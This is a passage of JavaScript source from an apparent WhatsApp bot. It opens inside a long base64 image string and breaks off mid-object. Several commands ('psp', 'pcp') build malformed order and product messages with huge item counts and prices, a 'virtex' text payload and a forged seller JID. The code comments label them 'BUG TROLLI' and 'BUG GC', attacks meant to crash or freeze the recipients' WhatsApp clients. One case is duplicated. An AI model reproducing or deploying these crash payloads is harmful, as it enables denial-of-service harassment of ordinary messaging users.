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",
							"caption": "https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: imeu,
						contextInfo: {}
					})
			hexa.relayWAMessage(
				res)
			await setTimeout(
				() => {
					reply(
						'Hacker ( SHERLYNN ~ 404 )'
					)
				}, 3000)
			break
		case 'psp': // BUG TROLLI + BUG GC + TROLLI
			if (!mek.key
				.fromMe && !
				isOwner) return
			buf = Mfake
			imeu = await Maslent
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await Maslent
				.prepareMessageFromContent(
					from, {
						"orderMessage": {
							"orderId": "150453297177375",
							"thumbnail": "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",
							"itemCount": 1000000000000,
							"status": "INQUIRY",
							"surface": "CATALOG",
							"orderTitle": "GUA GK NGERTI",
							"message": "entah lah gua nob",
							"sellerJid": "6288224859350@s.whatsapp.net",
							"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
							"totalAmount1000": "Rp 25.000.00",
							"totalCurrencyCode": "IDR",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: bugtrol,
						contextInfo: {}
					})

			Maslent
				.toggleDisappearingMessages(
					from,
					'Awoakwoakwoak'
				)
			Maslent
				.relayWAMessage(
					res)
			break
		case 'plp':
			res = await Maslent
				.prepareMessageFromContent(
					from, {
						"listMessage": {
							"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
							"description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
							"buttonText": vipi,
							"listType": "SINGLE_SELECT",
							"sections": [
							{
								"title": vipi,
								"rows": [
								{
									"title": "Banned",
									"rowId": "Banned"
								}]
							}]
						}
					}, {
						quoted: mek
					})
			Maslent
				.relayWAMessage(
					res)
			break
		case 'pcp':
			if (!mek.key
				.fromMe && !
				isOwner) return
			buf = Mfake
			imeu = await Maslent
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await Maslent
				.prepareMessageFromContent(
					from, {
						"productMessage": {
							"product": {
								"productImage": imeg,
								"productId": "150453297177375",
								"title": `${botname} ~ 404 ${vipi}`,
								"description": `${virtex}`,
								"currencyCode": "IDR",
								"priceAmount1000": "99999999999999999999999999999999",
								"productImageCount": 1
							},
							"businessOwnerJid": "6288224859350@s.whatsapp.net",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: bugtrol,
						contextInfo: {}
					})

			Maslent
				.relayWAMessage(
					res)
			break
			// Bug Trolli ( Sherlynn-Botz )
		case 'psp': // BUG TROLLI + BUG GC + TROLLI
			if (!mek.key
				.fromMe && !
				isOwner) return
			buf = Mfake
			imeu = await Maslent
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await Maslent
				.prepareMessageFromContent(
					from, {
						"orderMessage": {
							"orderId": "150453297177375",
